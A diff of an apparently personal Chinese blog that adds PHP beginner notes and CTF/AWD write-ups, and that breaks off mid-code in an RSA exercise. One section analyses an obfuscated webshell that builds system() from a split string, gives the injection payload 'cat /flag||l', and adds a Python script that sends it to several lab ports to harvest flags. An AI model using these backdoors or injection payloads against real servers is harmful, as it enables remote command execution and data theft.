@@ -182,7 +182,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-11-26 13:28:43" itemprop="dateModified" datetime="2021-11-26T13:28:43+08:00">2021-11-26</time>
+                <time title="修改时间：2021-11-26 17:01:28" itemprop="dateModified" datetime="2021-11-26T17:01:28+08:00">2021-11-26</time>
               </span>
 
           
@@ -220,11 +220,123 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> ......;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>可以分几行，后面的问号小于号可以省略。</p>
 <p>语句结束后要用 ' ; ' 符号结束。</p>
+<h3 id="变量">变量</h3>
+<p>用于储存临时性数据，相当于调取和利用时更加方便的容器。</p>
 <h3 id="连接符-.-用于连接字符串">连接符 . 用于连接字符串</h3>
 <p>php语句中用点号连接两个字符串或者多个字符串</p>
 <h3 id="变量的命名规则">变量的命名规则</h3>
 <p>php中用$符号来命名变量，其中变量必须用下划线或者字母开头，区分大小写，且不包含空格，可以用英文中的短下划线来分隔单词。</p>
+<h3 id="变量的数据类型">变量的数据类型</h3>
+<p>php中有字符串、整型、浮点型、数组等类型，不同的数据消耗的内存不一样，可用于查看当前PHP消耗的内存：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//memory_get_usage</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$m1</span> = memory_get_usage(); &gt;</span><br></pre></td></tr></table></figure>
+<p>php不需要在使用变量前声明变量的数据类型，会自动转换。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump  <span class="comment">//获取真正的数据类型</span></span><br><span class="line"><span class="comment">//== 比较运算符</span></span><br></pre></td></tr></table></figure>
+<h4 id="标量类型-整型">标量类型-整型</h4>
+<p>十进制、八进制、十六进制</p>
+<p>其中八进制开头是0，十六进制是0x，这里是阿拉伯数字0。</p>
+<h4 id="标量类型-浮点型">标量类型-浮点型</h4>
+<p>浮点型（浮点数、双精度数或实数），可以用小数点或者科学计数法表示。科学计数法可以使用e（大小写均可）。</p>
+<p>这里e代表科学计数法，后面的数字（x）若为正整数则等效乘10的x次方，负数则为负数次方。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$num_float</span> = <span class="number">1.999</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num_float</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$num_float1</span> = <span class="number">1.93e8</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num_float1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$num_float2</span> = <span class="number">7.0e-2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num_float2</span>;</span><br><span class="line"><span class="meta">?&gt;</span>  <span class="comment">// e代表的是一个*10，e后面的数字代表的是几个10，相当于科学计数法中的1.n*10**x。</span></span><br><span class="line"><span class="comment">//运行结果</span></span><br><span class="line">    <span class="comment">//1.999&lt;br /&gt;193000000&lt;br /&gt;0.07</span></span><br></pre></td></tr></table></figure>
+<h4 id="标量类型-字符串">标量类型-字符串</h4>
+<p>字符串由字符组成，在php字符串和字节，有256种不同字符的可能性。字符串型定义有三种方法，单引号、双引号、Heredoc。</p>
+<h5 id="转译">转译</h5>
+<p>如果想要字符串中包含引号，可以使用一对单引号囊括双引号，反过来亦可。或者采用转义符：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$str1</span> = <span class="string">&quot;i am a &#x27;person&#x27;!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str1</span>;</span><br><span class="line"><span class="variable">$str9</span> = <span class="string">&#x27;\&#x27;this is good\&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str9</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//i am a &#x27;person&#x27;!&#x27;this is good&#x27; </span></span><br></pre></td></tr></table></figure>
+<h5 id="与-相遇">$与"" 相遇</h5>
+<p>当双引号内包含变量，则变量会和括号中内容连接。</p>
+<p>单引号中包含变量，则变量会被作为字符串输出到结果中。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$variable_num</span> = <span class="string">&#x27;num&#x27;</span>;</span><br><span class="line"><span class="variable">$str1</span> = <span class="string">&quot;This is a <span class="subst">$variable_num</span>.&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str1</span>;</span><br><span class="line"><span class="variable">$str9</span> = <span class="string">&#x27;This is a $variable_num.&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str9</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//This is a num.This is a $variable_num. </span></span><br></pre></td></tr></table></figure>
+<h5 id="php中字符串过长的处理方式">php中字符串过长的处理方式</h5>
+<p>用"&lt;&lt;&lt;GOD"和"GOD;"包含字符串，这里要注意严格格式。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$str1</span> = <span class="string">&lt;&lt;&lt;GOD</span></span><br><span class="line"><span class="string">数论概论，离散数学及其应用</span></span><br><span class="line"><span class="string">应用密码学，数学基础</span></span><br><span class="line"><span class="string">GOD</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*数论概论，离散数学及其应用</span></span><br><span class="line"><span class="comment">应用密码学，数学基础*/</span></span><br></pre></td></tr></table></figure>
+<h3 id="特殊类型1-资源">特殊类型1-资源</h3>
+<p>资源由专门函数构造和使用，可以对资源进行操作（创建，使用，释放），不需要资源时应进行及时释放，或由系统启动垃圾回收机制，保护内存被消耗完。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = fopen(<span class="string">&quot;/var/html/1.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">    <span class="comment">//生成一个资源，赋值给变量</span></span><br></pre></td></tr></table></figure>
+<h3 id="特殊类型2-空类型-null">特殊类型2-空类型-NULL</h3>
+<p>NULL表示变量没有取值，对大小写不敏感。</p>
+<p>NULL的三种情况：</p>
+<p>1，被赋值为NULL。</p>
+<p>2，尚未被赋值。</p>
+<p>3，被unset()。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> error_reporting(<span class="number">0</span>); <span class="comment">//禁止显示PHP警告提示</span></span><br><span class="line"> <span class="variable">$var</span>;</span><br><span class="line"> var_dump(<span class="variable">$var</span>);</span><br><span class="line"> <span class="variable">$var1</span> = <span class="literal">null</span>;</span><br><span class="line"> var_dump(<span class="variable">$var1</span>);</span><br><span class="line"> <span class="variable">$var2</span> = <span class="literal">NULL</span>;</span><br><span class="line"> var_dump( <span class="variable">$var2</span>);</span><br><span class="line"> <span class="variable">$var3</span> = <span class="string">&quot;123123123&quot;</span>;</span><br><span class="line"> <span class="keyword">unset</span>(<span class="variable">$var3</span>);</span><br><span class="line"> var_dump(<span class="variable">$var3</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>var_dump函数相当于打印，而unset（）释放了变量相当于变量没被赋值，变量值为NULL。</p>
+<h3 id="常量">常量</h3>
+<p>值不变的量，分为系统常量和自定义常量。</p>
+<p>常量用函数define()定义</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">define(<span class="string">&#x27;pi&#x27;</span>,<span class="number">3</span>);</span><br><span class="line">define(<span class="variable">$pi</span>,<span class="number">3.1</span>);</span><br><span class="line"><span class="variable">$pi</span>=<span class="number">5</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$pi</span>-pi</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//2</span></span><br></pre></td></tr></table></figure>
+<p>这里定义了一个常量值为3，变量值为5。</p>
+<p><u>通常常量全部大写</u>，但是这里没大写。</p>
+<h4 id="常量的优势">常量的优势</h4>
+<p>避免因重复定义导致数据混乱，减少团队操作。增加代码可维护性。、</p>
+<h4 id="系统常量">系统常量</h4>
+<p>1，<strong>FILE</strong> :php程序文件名。用于获取当前文件在服务器的物理位置。</p>
+<p>2，<strong>LINE</strong> :PHP程序文件行数。用于获取当前代码在第几行。</p>
+<p>3，PHP_VERSION:解析器版本号输出当前PHP解析器的版本号。</p>
+<p>4，PHP_OS：执行当前PHP版本的操作系统名称。输出服务器所用的操作系统。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__FILE__</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__LINE__</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_VERSION;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_OS;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="常量取值">常量取值</h4>
+<p>1，直接用常量名</p>
+<p>2，用constant()函数。</p>
+<p>判断常量是否被定义</p>
+<p>isdefined()</p>
 <h2 id="语句">语句</h2>
+<h3 id="运算符">运算符</h3>
+<table>
+<thead>
+<tr class="header">
+<th>&amp;</th>
+<th>引用赋值两个变量共用一个值</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>==</td>
+<td>等于，相等返回TRUE</td>
+</tr>
+<tr class="even">
+<td>===</td>
+<td>全等，需要比较数值和类型</td>
+</tr>
+<tr class="odd">
+<td>!==</td>
+<td>非全等，类型或者数值不同返回TRUE</td>
+</tr>
+<tr class="even">
+<td>&lt;&gt;</td>
+<td>不等</td>
+</tr>
+</tbody>
+</table>
+<h3 id="三元运算符">三元运算符：</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span> = <span class="variable">$a</span> &gt;= <span class="number">100</span> ? <span class="string">&#x27;front&#x27;</span>:<span class="string">&#x27;last&#x27;</span></span><br><span class="line"><span class="comment">//变量大于等于100为真则表达式为front，反之为last</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">102</span>;</span><br><span class="line"><span class="variable">$b0</span> = <span class="variable">$a</span> &gt;= <span class="number">100</span>?<span class="string">&quot;1111&quot;</span>:<span class="string">&quot;11112222&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b0</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//1111</span></span><br></pre></td></tr></table></figure>
+<p>逻辑运算符：</p>
+<table>
+<thead>
+<tr class="header">
+<th>$a and $b</th>
+<th>与，都为真则返回真</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>$a or $b</td>
+<td>或，有一真则真</td>
+</tr>
+<tr class="even">
+<td><span class="math inline">\(a xor \$b | 有且仅有一个为真才返回真 | | !\)</span>a</td>
+<td>如果a不为真则返回真</td>
+</tr>
+<tr class="odd">
+<td>$a&amp;&amp;$b</td>
+<td>如果均为真则返回真</td>
+</tr>
+<tr class="even">
+<td>$a||b</td>
+<td>任意为真，返回真</td>
+</tr>
+</tbody>
+</table>
 <h3 id="echo-输出字符串">echo-输出字符串</h3>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span><span class="string">&#x27;php123&#x27;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <h2 id="问题解决">问题解决</h2>
@@ -410,7 +522,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-11-26 13:02:08" itemprop="dateModified" datetime="2021-11-26T13:02:08+08:00">2021-11-26</time>
+                <time title="修改时间：2021-11-26 20:40:39" itemprop="dateModified" datetime="2021-11-26T20:40:39+08:00">2021-11-26</time>
               </span>
 
           
@@ -476,9 +588,14 @@
 <p>如果是采取手动，则继续在检查-网络中查找flag{</p>
 <h5 id="注意">注意：</h5>
 <p>index.php可以看作索引，当索引的内容不在索引目录中时会跳转到404.html的模板中，而本次的模板恰好含有打印的代码。</p>
+<h4 id="wtf.php-顺序执行命令之">wtf.php-顺序执行命令之||</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;s&quot;</span>;<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$config</span>=<span class="string">&quot;s..y..s..t..e..m&quot;</span>; <span class="variable">$config</span>=implode(explode(<span class="string">&quot;..&quot;</span>,<span class="variable">$config</span>)); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$config</span>(<span class="variable">$file</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>explode分割字符串，构造system()命令，根据第一行的拼接可以得到第三行运行的是类似system(.....s)的命令，可以想到ls命令结尾，用||执行命令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//172.17.135.39:8009/App/Mobile/Controller/wtf.php</span></span><br><span class="line">file=cat /flag||l</span><br></pre></td></tr></table></figure>
 <h2 id="script">script</h2>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">位置：config.php</span></span><br><span class="line"><span class="string">内容：</span></span><br><span class="line"><span class="string">&lt;?php </span></span><br><span class="line"><span class="string">    $a = strtr(&#x27;azxcvt&#x27;,&#x27;zxcv&#x27;,&#x27;sser&#x27;);</span></span><br><span class="line"><span class="string">    $a($_POST[&#x27;password&#x27;]);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">方式：POST传入参数</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> requests,re  <span class="comment"># 导入库https://docs.python-requests.org/en/latest/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">group_flag=[]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getaim</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8001</span>,<span class="number">8011</span>):</span><br><span class="line">        <span class="keyword">if</span> i!= <span class="number">8001</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.post(<span class="string">&#x27;http://172.17.135.39:&#123;&#125;/index.php/unknowm.txt&#x27;</span>.<span class="built_in">format</span>(i), data=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;/flag&#x27;</span>&#125;)</span><br><span class="line">                obj = re.<span class="built_in">compile</span>(<span class="string">r&#x27;[f][l][a][g][\&#123;][\w]*[\&#125;]&#x27;</span>,re.I|re.M)  <span class="comment"># 生成一个正则表达式对象，用于直接查找</span></span><br><span class="line">                m = obj.findall(r.text)[<span class="number">0</span>]  <span class="comment"># 取生成的列表中的索引为0的数据</span></span><br><span class="line">                group_flag.append(m)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;地址数据未获得&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">    <span class="built_in">print</span>(group_flag)</span><br><span class="line"></span><br><span class="line">getaim()</span><br></pre></td></tr></table></figure>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#404.php，get传入</span></span><br><span class="line"><span class="keyword">import</span> requests,re  <span class="comment"># 导入库https://docs.python-requests.org/en/latest/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">group_flag=[]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getaim</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8001</span>,<span class="number">8011</span>):</span><br><span class="line">        <span class="keyword">if</span> i!= <span class="number">8001</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.get(<span class="string">&#x27;http://172.17.135.39:&#123;&#125;/404.php&#x27;</span>.<span class="built_in">format</span>(i),params = &#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;/flag&#x27;</span>&#125;)</span><br><span class="line">                obj = re.<span class="built_in">compile</span>(<span class="string">r&#x27;[f][l][a][g][\&#123;][\w]*[\&#125;]&#x27;</span>,re.I|re.M)  <span class="comment"># 生成一个正则表达式对象，用于直接查找</span></span><br><span class="line">                m = obj.findall(r.text)[<span class="number">0</span>]  <span class="comment"># 取生成的列表中的索引为0的数据</span></span><br><span class="line">                group_flag.append(m)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;地址数据未获得&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">    <span class="built_in">print</span>(group_flag)</span><br><span class="line"></span><br><span class="line">getaim()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re  <span class="comment"># 导入库https://docs.python-requests.org/en/latest/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">group_flag=[]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getaim</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8001</span>,<span class="number">8011</span>):</span><br><span class="line">        <span class="keyword">if</span> i!= <span class="number">8001</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.post(<span class="string">&#x27;http://172.17.135.39:&#123;&#125;/App/Mobile/Controller/wtf.php&#x27;</span>.<span class="built_in">format</span>(i), data=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;cat /flag||l&#x27;</span>&#125;)</span><br><span class="line">                obj = re.<span class="built_in">compile</span>(<span class="string">r&#x27;[f][l][a][g][\&#123;][\w]*[\&#125;]&#x27;</span>,re.I|re.M)  <span class="comment"># 生成一个正则表达式对象，用于直接查找</span></span><br><span class="line">                m = obj.findall(r.text)[<span class="number">0</span>]  <span class="comment"># 取生成的列表中的索引为0的数据</span></span><br><span class="line">                group_flag.append(m)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;地址数据未获得&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">    <span class="built_in">print</span>(group_flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getaim()</span><br></pre></td></tr></table></figure>
 <h3 id="reques模块分析">reques模块分析</h3>
 <h4 id="传参方式">传参方式</h4>
 <p>GET：</p>
@@ -906,7 +1023,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-11-21 21:55:58" itemprop="dateModified" datetime="2021-11-21T21:55:58+08:00">2021-11-21</time>
+                <time title="修改时间：2021-11-27 21:16:39" itemprop="dateModified" datetime="2021-11-27T21:16:39+08:00">2021-11-27</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1121,7 +1238,12 @@ c_1 = F_1+F_2,c_2=F_1^3+F_2^3,and, (a+b)*(a^2-a*b+b^2)=a^3+b^3
 F_1+F_2=X,F_1*F_2 = Y,and,get \iff F_2^2 -Y*F_2+F_2=0
 \]</span> 4，解一元二次方程并对结果进行转换和拼接</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">n= <span class="number">636585149594574746909030160182690866222909256464847291783000651837227921337237899651287943597773270944384034858925295744880727101606841413640006527614873110651410155893776548737823152943797884729130149758279127430044739254000426610922834573094957082589539445610828279428814524313491262061930512829074466232633130599104490893572093943832740301809630847541592548921200288222432789208650949937638303429456468889100192613859073752923812454212239908948930178355331390933536771065791817643978763045030833712326162883810638120029378337092938662174119747687899484603628344079493556601422498405360731958162719296160584042671057160241284852522913676264596201906163</span></span><br><span class="line">m1=<span class="number">90009974341452243216986938028371257528604943208941176518717463554774967878152694586469377765296113165659498726012712288670458884373971419842750929287658640266219686646956929872115782173093979742958745121671928568709468526098715927189829600497283118051641107305128852697032053368115181216069626606165503465125725204875578701237789292966211824002761481815276666236869005129138862782476859103086726091860497614883282949955023222414333243193268564781621699870412557822404381213804026685831221430728290755597819259339616650158674713248841654338515199405532003173732520457813901170264713085107077001478083341339002069870585378257051150217511755761491021553239</span></span><br><span class="line">m2=<span class="number">487443985757405173426628188375657117604235507936967522993257972108872283698305238454465723214226871414276788912058186197039821242912736742824080627680971802511206914394672159240206910735850651999316100014691067295708138639363203596244693995562780286637116394738250774129759021080197323724805414668042318806010652814405078769738548913675466181551005527065309515364950610137206393257148357659666687091662749848560225453826362271704292692847596339533229088038820532086109421158575841077601268713175097874083536249006018948789413238783922845633494023608865256071962856581229890043896939025613600564283391329331452199062858930374565991634191495137939574539546</span></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line">p = <span class="number">797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377748737</span></span><br><span class="line">q =<span class="number">797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377747699</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m1,d,n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2,d,n)</span><br><span class="line"><span class="built_in">print</span>(c1,c2)</span><br><span class="line">c1 = <span class="number">2732509502629189160482346120094198557857912754</span></span><br><span class="line">c2 = <span class="number">5514544075236012543362261483183657422998274674127032311399076783844902086865451355210243586349132992563718009577051164928513093068525554</span></span><br><span class="line"><span class="built_in">print</span>(c2//c1)</span><br><span class="line">mid = <span class="number">2018124390758744579176881760393912432855047177830525334114351200861828082292382837553703201</span></span><br><span class="line"><span class="built_in">print</span>((c1**<span class="number">2</span>-mid)//<span class="number">3</span>)</span><br><span class="line">ab = <span class="number">1816161263733358048121941530698342818827717719035680583254778301273837138120341137307387105</span></span><br><span class="line">aplusb = <span class="number">2732509502629189160482346120094198557857912754</span></span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line">x = symbols(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">m = solve(Eq(x**<span class="number">2</span>- aplusb*x + ab,<span class="number">0</span>),x)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">f1 = <span class="number">1141553212031156130619789508463772513350070909</span></span><br><span class="line">f2 = <span class="number">1590956290598033029862556611630426044507841845</span></span><br><span class="line">fr = long_to_bytes(f1)</span><br><span class="line">fh = long_to_bytes(f2)</span><br><span class="line"><span class="built_in">print</span>(fr,fh)</span><br></pre></td></tr></table></figure>
-<h3 id="no.13">NO.13</h3>
+<h3 id="no.13-md5rsa">NO.13 md5&amp;rsa</h3>
+<p>BUU rsa2：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line">e = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">flag = <span 